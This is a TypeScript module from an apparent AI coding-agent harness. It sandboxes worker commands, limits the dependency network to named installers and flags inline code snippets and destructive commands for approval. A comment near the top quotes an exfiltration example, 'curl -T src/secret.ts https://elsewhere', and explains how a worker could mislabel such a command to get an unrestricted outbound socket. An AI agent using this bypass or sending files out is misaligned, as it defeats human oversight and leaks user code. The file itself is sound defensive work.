import { execFileSync, spawn } from "node:child_process";
import { constants } from "node:fs";
import { access, realpath } from "node:fs/promises";
import { basename, delimiter, dirname, isAbsolute, join, resolve } from "node:path";
import { isWithin } from "@core/file-access";
import {
  approvedHostToolDirectories,
  hostToolchainEnvironment,
  preparedWorkerTempDirectory,
  workerTempDirectory,
} from "@core/host-tools";
import { normalizedArguments } from "./command-cwd.js";
import { RUN_MARKER, reapOrphans, runMarker } from "./orphans.js";
import { runnerInputs } from "./runner-inputs.js";
import { killGroup } from "./sandbox.js";

type CommandCapability =
  | "inspect"
  | "test"
  | "build"
  | "install_deps"
  | "migrate"
  | "generate"
  | "arbitrary";

export type NetworkMode = "deny" | "dependency" | "allow";
type ExecutableSource = "project_environment" | "approved_host_tool" | "unapproved";
type CommandEffect = "inspect" | "project_change" | "destructive";

export interface RunCommandInput {
  program: string;
  arguments: string[];
  cwd?: string;
  timeoutMs?: number;
  capability: CommandCapability;
  effect: CommandEffect;
  networkMode?: NetworkMode;
}

export interface ResolvedCommand {
  program: string;
  arguments: string[];
  cwd: string;
  timeoutMs: number;
  capability: CommandCapability;
  effect: CommandEffect;
  networkMode: NetworkMode;
  executable: string;
  invocationPath: string;
  executableSource: ExecutableSource;
  requestedProgram: string;
  requestedArguments: string[];
  /** For a script runner, a fingerprint of the files that decide what it runs (M7). */
  inputs?: string;
  env: NodeJS.ProcessEnv;
  processGroup: true;
}

const OUTPUT_LIMIT = 24_000;
/** After a command exits, how long its output pipes may stay open before they are closed. */
const EXIT_DRAIN_MS = 1_000;

/**
 * Programs that may claim `install_deps`, and with it the dependency network.
 *
 * Both the capability and the network mode arrive in the worker's own tool
 * call, so without this the label was self-granted: `curl -T src/secret.ts
 * https://elsewhere` declared as `install_deps` took an unrestricted outbound
 * socket, and in Assist with downloads approved it never asked. The set of
 * programs that genuinely install dependencies is small and nameable, so name
 * it. A worker that needs something else asks for it as an ordinary command.
 */
const DEPENDENCY_INSTALLERS = new Set([
  "bun",
  "bundle",
  "cargo",
  "composer",
  "dotnet",
  "gem",
  "go",
  "gradle",
  "mvn",
  "npm",
  "pip",
  "pip3",
  "pipenv",
  "pnpm",
  "poetry",
  "uv",
  "yarn",
]);

/**
 * What `install_deps` may run, per installer (L19): the first plain argument
 * must be an install subcommand, and no code-running word such as `run`,
 * `exec` or `test` may appear anywhere, so `npm --prefix install run build`
 * cannot pass as an install. A flag's value must use the `--flag=value` form.
 * Anything else runs as an ordinary command, without the dependency network.
 */
const INSTALL_SUBCOMMANDS: Record<string, string[][]> = {
  npm: [
    ["install"],
    ["i"],
    ["ci"],
    ["add"],
    ["update"],
    ["up"],
    ["uninstall"],
    ["remove"],
    ["rm"],
    ["dedupe"],
    ["prune"],
  ],
  pnpm: [
    ["install"],
    ["i"],
    ["add"],
    ["update"],
    ["up"],
    ["remove"],
    ["rm"],
    ["fetch"],
    ["dedupe"],
    ["prune"],
  ],
  yarn: [[], ["install"], ["add"], ["remove"], ["up"], ["upgrade"], ["dedupe"]],
  bun: [["install"], ["i"], ["add"], ["remove"], ["rm"], ["update"]],
  pip: [["install"], ["download"], ["uninstall"]],
  pip3: [["install"], ["download"], ["uninstall"]],
  uv: [
    ["sync"],
    ["lock"],
    ["add"],
    ["remove"],
    ["venv"],
    ["pip", "install"],
    ["pip", "sync"],
    ["pip", "uninstall"],
    ["pip", "compile"],
  ],
  poetry: [["install"], ["add"], ["remove"], ["lock"], ["update"], ["sync"]],
  pipenv: [["install"], ["sync"], ["lock"], ["uninstall"], ["update"]],
  cargo: [["fetch"], ["generate-lockfile"], ["update"], ["vendor"]],
  go: [["mod", "download"], ["mod", "tidy"], ["mod", "vendor"], ["get"]],
  gem: [["install"], ["fetch"], ["update"]],
  bundle: [[], ["install"], ["update"], ["lock"], ["cache"]],
  composer: [["install"], ["update"], ["require"], ["remove"]],
  mvn: [["dependency:go-offline"], ["dependency:resolve"]],
  gradle: [["dependencies"]],
  dotnet: [["restore"], ["add", "package"], ["tool", "restore"]],
};

/** Words that make an installer run code; refused anywhere in an install's arguments. */
const CODE_RUNNING_WORDS = new Set([
  "run",
  "run-script",
  "exec",
  "x",
  "dlx",
  "test",
  "t",
  "start",
  "restart",
  "node",
  "it",
  "install-test",
  "cit",
  "install-ci-test",
  "generate",
  "bench",
  "publish",
  "tool",
  "script",
  "run-script",
]);

/** Why an install_deps command is not a plain dependency install, if it is not. */
export function codeRunningSubcommand(
  program: string,
  args: readonly string[],
): string | undefined {
  const base = (program.split(/[\\/]/).pop() ?? program).toLowerCase().replace(/\.exe$/, "");
  const allowed = INSTALL_SUBCOMMANDS[base];
  if (!allowed) return "not an install";
  const words = args.filter((arg) => !arg.startsWith("-"));
  const running = words.find((word) => CODE_RUNNING_WORDS.has(word));
  const match = allowed.find(
    (sub) => sub.every((word, i) => words[i] === word) && (sub.length > 0 || words.length === 0),
  );
  // `uv tool ...` and `dotnet tool restore` name "tool"; only the listed form passes.
  if (match && !(running && !match.includes(running))) return undefined;
  return running ?? (words[0] ? words.slice(0, 2).join(" ") : "this form");
}

/** Whether `program` is one of the tools allowed to install dependencies. */
export function isDependencyInstaller(program: string): boolean {
  const base = (program.split(/[\\/]/).pop() ?? program).toLowerCase();
  return DEPENDENCY_INSTALLERS.has(base.endsWith(".exe") ? base.slice(0, -4) : base);
}

export function workerEnvironment(
  privateHome: string,
  extraPath: string[] = [],
  cwd?: string,
  runtimeDirs: string[] = [],
): NodeJS.ProcessEnv {
  const path = [
    ...extraPath,
    cwd ? join(cwd, ".venv", "bin") : "",
    ...runtimeDirs,
    ...approvedHostToolDirectories(),
  ]
    .filter(Boolean)
    .join(delimiter);
  const virtualenv = virtualenvFromPath(extraPath);
  return {
    PATH: path,
    HOME: privateHome,
    TMPDIR: workerTempDirectory(privateHome),
    LANG: "en_US.UTF-8",
    TERM: "dumb",
    CI: "1",
    GIT_CONFIG_NOSYSTEM: "1",
    GIT_CONFIG_GLOBAL: "/dev/null",
    GIT_TERMINAL_PROMPT: "0",
    PIP_DISABLE_PIP_VERSION_CHECK: "1",
    PIP_REQUIRE_VIRTUALENV: "true",
    UV_CACHE_DIR: join(privateHome, "cache", "uv"),
    // Installing a Python runtime is host authority, never an implicit side
    // effect of creating or syncing a project environment.
    UV_PYTHON_DOWNLOADS: "never",
    npm_config_cache: join(privateHome, "cache", "npm"),
    // The compilers keep these in the user's own temp and cache folders,
    // which a sandboxed command cannot write.
    CLANG_MODULE_CACHE_PATH: join(workerTempDirectory(privateHome), "clang-module-cache"),
    xcrun_db: join(workerTempDirectory(privateHome), "xcrun_db"),
    ...hostToolchainEnvironment(),
    ...(virtualenv ? { VIRTUAL_ENV: virtualenv } : {}),
    [RUN_MARKER]: runMarker(privateHome),
  };
}

function virtualenvFromPath(extraPath: string[]): string | undefined {
  const bin = extraPath.find((dir) => ["bin", "Scripts"].includes(basename(dir)));
  return bin ? dirname(bin) : undefined;
}

export async function resolveCommand(
  input: RunCommandInput,
  projectRoot: string,
  extraPath: string[],
  privateHome: string,
  rewriteInvocation?: (
    program: string,
    args: string[],
  ) => { program: string; arguments: string[] } | undefined,
  runtimeDirs: string[] = [],
  /** Folders granted beyond the attached project, from `writeRootsFor`. */
  writeRoots: string[] = [],
): Promise<ResolvedCommand> {
  const cwd = resolve(projectRoot, input.cwd ?? ".");
  const commandRoots = [projectRoot, ...writeRoots];
  if (!commandRoots.some((root) => isWithin(root, cwd))) {
    throw new Error("Working directory must remain inside the attached project.");
  }
  input = { ...input, arguments: normalizedArguments(input.program, input.arguments, cwd) };
  const requestedProgram = input.program;
  const requestedArguments = [...input.arguments];
  const rewritten = rewriteInvocation?.(input.program, input.arguments);
  if (rewritten) {
    input = { ...input, program: rewritten.program, arguments: rewritten.arguments };
  }
  const env = workerEnvironment(privateHome, extraPath, cwd, runtimeDirs);
  await preparedWorkerTempDirectory(privateHome);
  const { executable, invocationPath } = await resolveExecutable(
    input.program,
    cwd,
    extraPath,
    env.PATH ?? "",
  );
  const source = classifyExecutable(
    executable,
    invocationPath,
    extraPath,
    commandRoots,
    env.PATH ?? "",
    input.program,
  );
  // Omitted means what the project's network switches allow (ADR 015).
  const networkMode =
    input.networkMode ?? (input.capability === "install_deps" ? "dependency" : "allow");
  // Classify what was *asked for*, not what the rewrite turned it into. The
  // rewrite exists to run tools through the project's own toolchain, and it
  // renames the program: `python -c` becomes `uv run python -c`, whose
  // basename is `uv`, which this classifier has never heard of. ADR 010 makes
  // an arbitrary interpreter snippet a decision, so it has to survive the
  // rename — and looking through `uv run` catches the reverse case, where the
  // worker asks for the wrapped form itself.
  if (
    looksLikeArbitrarySnippet(requestedProgram, requestedArguments) ||
    looksLikeArbitrarySnippet(input.program, input.arguments)
  ) {
    return {
      program: input.program,
      arguments: input.arguments,
      cwd,
      timeoutMs: Math.min(600_000, input.timeoutMs ?? 600_000),
      capability: "arbitrary",
      effect: input.effect,
      networkMode,
      executable,
      invocationPath,
      executableSource: source,
      requestedProgram,
      requestedArguments,
      env,
      processGroup: true,
    };
  }
  return {
    program: input.program,
    arguments: input.arguments,
    cwd,
    timeoutMs: Math.min(600_000, input.timeoutMs ?? 600_000),
    capability: input.capability,
    effect: input.effect,
    networkMode,
    executable,
    invocationPath,
    executableSource: source,
    requestedProgram,
    requestedArguments,
    inputs: await runnerInputs(requestedProgram, requestedArguments, cwd),
    env,
    processGroup: true,
  };
}

export function looksLikeArbitrarySnippet(program: string, args: readonly string[]): boolean {
  const base = (program.split(/[\\/]/).pop() ?? program).toLowerCase();
  // `uv run python -c …` and `uvx python -c …` are the same decision as
  // `python -c …`: look through the runner at what it is about to run.
  if (/^uvx?$/.test(base.endsWith(".exe") ? base.slice(0, -4) : base)) {
    const rest = base.startsWith("uvx") ? [...args] : [...args].slice(args[0] === "run" ? 1 : 0);
    const inner = rest.findIndex((arg) => !arg.startsWith("-"));
    if (inner >= 0) return looksLikeArbitrarySnippet(rest[inner], rest.slice(inner + 1));
  }
  const executable = base.endsWith(".exe") ? base.slice(0, -4) : base;
  // Short options combine (`bash -ec`, `python3 -Sc`, `perl -lne`), and long
  // ones take `=value` (`node --eval=…`): look for the letter in a cluster
  // and the name before an `=`, not only for the bare flag (L20).
  const cluster = (letters: string) => {
    const pattern = new RegExp(`^-[A-Za-z]*[${letters}]`);
    return args.some((arg) => !arg.startsWith("--") && pattern.test(arg));
  };
  const long = (...names: string[]) =>
    args.some((arg) => names.some((name) => arg === name || arg.startsWith(`${name}=`)));
  if (/^python[0-9.]*$/.test(executable)) return cluster("c");
  if (/^(node|nodejs|bun|deno)$/.test(executable)) {
    return cluster("ep") || long("--eval", "--print");
  }
  if (executable === "perl") return cluster("eE");
  if (executable === "ruby") return cluster("e");
  if (executable === "php") return cluster("r") || long("--run");
  if (/^(sh|bash|dash|zsh|ksh|fish)$/.test(executable)) {
    return cluster("c") || long("--command");
  }
  if (/^(pwsh|powershell)$/.test(executable)) {
    return args.some((arg) => /^(?:-c|-command)$/i.test(arg));
  }
  if (executable === "cmd") {
    return args.some((arg) => /^\/(?:c|k)$/i.test(arg));
  }
  return false;
}

/**
 * Identify effects that remain approval-worthy even inside the project sandbox.
 * This is intentionally a small set of semantic boundaries, not an allowlist of
 * frameworks or test commands. Unknown routine commands remain contained by the
 * OS sandbox; raw code snippets and recognizable destructive operations ask.
 */
export function destructiveCommandReason(command: {
  program: string;
  arguments: readonly string[];
  capability: ResolvedCommand["capability"];
  effect?: CommandEffect;
  executableSource?: ExecutableSource;
}): string | undefined {
  return destructiveOperationReason(command);
}

export function effectiveCommandEffect(command: {
  program: string;
  arguments: readonly string[];
  capability: ResolvedCommand["capability"];
  effect: CommandEffect;
}): CommandEffect {
  return destructiveOperationReason(command) ? "destructive" : command.effect;
}

function destructiveOperationReason(command: {
  program: string;
  arguments: readonly string[];
  capability?: ResolvedCommand["capability"];
  effect?: CommandEffect;
  executableSource?: ExecutableSource;
}): string | undefined {
  if (command.effect === "destructive") {
    return "The worker identified this command as destructive or data-discarding.";
  }

  if (command.capability === "arbitrary" && command.executableSource === "project_environment") {
    return undefined;
  }
  if (command.capability === "arbitrary") return "This command executes an arbitrary code snippet.";

  const program = basename(command.program).toLowerCase();
  const args = command.arguments.map((value) => value.toLowerCase());
  if (["rm", "rmdir", "unlink", "shred", "truncate"].includes(program)) {
    return "This command deletes or truncates project files.";
  }
  if (
    program === "git" &&
    ["reset", "clean", "restore", "checkout", "rebase"].includes(args[0] ?? "")
  ) {
    return "This Git operation can discard or rewrite project work.";
  }
  if (
    args.some((value) => ["flush", "reset_db", "reset-db", "flushall", "flushdb"].includes(value))
  ) {
    return "This command can erase project data.";
  }
  if (["dropdb", "dropuser"].includes(program)) {
    return "This database command deletes a database resource.";
  }
  return undefined;
}

async function resolveExecutable(
  program: string,
  cwd: string,
  extraPath: string[],
  pathEnv: string,
): Promise<{ executable: string; invocationPath: string }> {
  if (program.includes("/") || program.includes("\\") || isAbsolute(program)) {
    const full = resolve(cwd, program);
    await access(full, constants.X_OK | constants.R_OK);
    return { executable: await realpath(full), invocationPath: full };
  }
  const search = [...extraPath, ...pathEnv.split(delimiter)];
  for (const dir of search) {
    if (!dir) continue;
    const candidate = join(dir, program);
    if (
      await access(candidate, constants.X_OK).then(
        () => true,
        () => false,
      )
    ) {
      return { executable: await realpath(candidate), invocationPath: candidate };
    }
  }
  throw new Error(`Program ${program} is not available in the project environment.`);
}

function classifyExecutable(
  executable: string,
  invocationPath: string,
  extraPath: string[],
  /** The attached project and every folder granted beside it. */
  projectRoots: string[],
  pathEnv: string,
  requestedProgram: string,
): ExecutableSource {
  if (
    extraPath.some((dir) => isWithin(dir, invocationPath)) ||
    projectRoots.some((root) => isWithin(root, invocationPath))
  ) {
    return "project_environment";
  }
  // A bare program resolved from Dispatch's sanitized PATH is a host tool. Its
  // behavior is constrained by the qualified OS sandbox in Assist mode. This
  // stays capability-based instead of embedding a list of ecosystems here.
  if (
    !requestedProgram.includes("/") &&
    !requestedProgram.includes("\\") &&
    pathEnv.split(delimiter).some((dir) => dir && isWithin(dir, invocationPath))
  ) {
    return "approved_host_tool";
  }
  // An explicit path directly inside a sanitized tool directory (for example
  // the uv that environment discovery found in /opt/homebrew/bin) is the same
  // trusted tool as its bare name, not an unapproved executable.
  if (pathEnv.split(delimiter).some((dir) => dir && dirname(invocationPath) === dir)) {
    return "approved_host_tool";
  }
  return "unapproved";
}

/**
 * Every process below `pid`, by parent links. Killing the command's process
 * group misses one that moved to its own group: swift test's
 * swiftpm-testing-helper does, and a hung test would outlive each timed-out
 * run.
 */
export function descendants(
  pid: number,
  table: Array<[number, number]> = processTable(),
): number[] {
  const children = new Map<number, number[]>();
  for (const [child, parent] of table)
    children.set(parent, [...(children.get(parent) ?? []), child]);
  const found: number[] = [];
  const queue = [pid];
  for (let next = queue.shift(); next !== undefined; next = queue.shift()) {
    for (const child of children.get(next) ?? []) {
      if (found.includes(child)) continue;
      found.push(child);
      queue.push(child);
    }
  }
  return found;
}

function processTable(): Array<[number, number]> {
  try {
    return execFileSync("/bin/ps", ["-axo", "pid=,ppid="], { encoding: "utf8", timeout: 5000 })
      .split("\n")
      .map((line) => line.trim().split(/\s+/).map(Number))
      .filter((row): row is [number, number] => row.length === 2 && row.every(Number.isFinite));
  } catch {
    return [];
  }
}

const ORPHAN_SCAN_AFTER_MS = 2000;

export async function executeResolvedCommand(
  command: ResolvedCommand,
  signal: AbortSignal,
  onData?: (chunk: string) => void,
): Promise<{ exitCode: number | null; output: string; error?: string }> {
  if (signal.aborted) return { exitCode: null, output: "", error: "Cancelled" };
  return new Promise((resolveResult) => {
    const child = spawn(command.executable, command.arguments, {
      cwd: command.cwd,
      env: command.env,
      detached: true,
      stdio: ["ignore", "pipe", "pipe"],
    });
    let output = "";
    let error: string | undefined;
    let forceKill: ReturnType<typeof setTimeout> | undefined;
    const terminate = (reason: string) => {
      error = reason;
      if (!child.pid) return;
      // Found while the command still runs: once it exits they belong to launchd.
      const escaped = descendants(child.pid);
      const signalAll = (name: NodeJS.Signals) => {
        for (const target of [-child.pid!, ...escaped]) {
          try {
            process.kill(target, name);
          } catch {
            /* already exited */
          }
        }
      };
      signalAll("SIGTERM");
      forceKill = setTimeout(() => signalAll("SIGKILL"), 1000);
    };
    const abort = () => terminate("Cancelled");
    signal.addEventListener("abort", abort, { once: true });
    const timer = setTimeout(() => terminate("Command timed out"), command.timeoutMs);
    const collect = (data: Buffer) => {
      const text = data.toString("utf8");
      onData?.(text);
      output = (output + text).slice(-OUTPUT_LIMIT);
    };
    child.stdout?.on("data", collect);
    child.stderr?.on("data", collect);
    child.on("error", (caught) => {
      error = caught.message;
    });
    // The command is over when its own process exits. Anything it started and
    // left behind goes with it: a leftover could otherwise keep working in the
    // project, or race the next command (H3). A process that left the group
    // is out of reach here once the command has exited (a timeout or cancel
    // finds it first, through `descendants`), but its sandbox still binds it,
    // and it loses the output pipe below.
    let drain: ReturnType<typeof setTimeout> | undefined;
    const started = Date.now();
    child.on("exit", () => {
      killGroup(child.pid);
      // A long or ended command is where children escape the group; a quick
      // one is not worth the process scan.
      if (error || Date.now() - started > ORPHAN_SCAN_AFTER_MS)
        reapOrphans(command.env?.[RUN_MARKER]);
      drain = setTimeout(() => {
        child.stdout?.destroy();
        child.stderr?.destroy();
      }, EXIT_DRAIN_MS);
    });
    child.on("close", (code) => {
      clearTimeout(timer);
      if (forceKill) clearTimeout(forceKill);
      if (drain) clearTimeout(drain);
      signal.removeEventListener("abort", abort);
      resolveResult({ exitCode: code, output, ...(error ? { error } : {}) });
    });
    if (signal.aborted) abort();
  });
}

export function displayCommand(command: Pick<ResolvedCommand, "program" | "arguments" | "cwd">): {
  program: string;
  arguments: string[];
  cwd: string;
} {
  return { program: command.program, arguments: command.arguments, cwd: command.cwd };
}

export { dirname };
